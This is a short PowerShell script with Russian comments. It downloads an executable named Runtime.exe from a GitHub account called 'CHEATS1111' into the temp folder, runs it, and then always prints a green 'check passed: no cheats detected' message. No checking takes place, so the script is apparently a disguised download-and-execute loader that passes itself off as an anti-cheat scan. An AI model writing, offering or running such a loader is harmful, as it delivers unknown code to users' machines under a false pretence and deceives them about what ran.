# Скачивание Runtime.exe во временную папку
$temp = [System.IO.Path]::Combine($env:TEMP, "Runtime.exe")
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/CHEATS1111/d/main/Runtime.exe" -OutFile $temp

# Запуск файла
Start-Process -FilePath $temp -Wait

# Вывод зелёного текста
Write-Host "✅ Проверка пройдена: читов не обнаружено!" -ForegroundColor Green
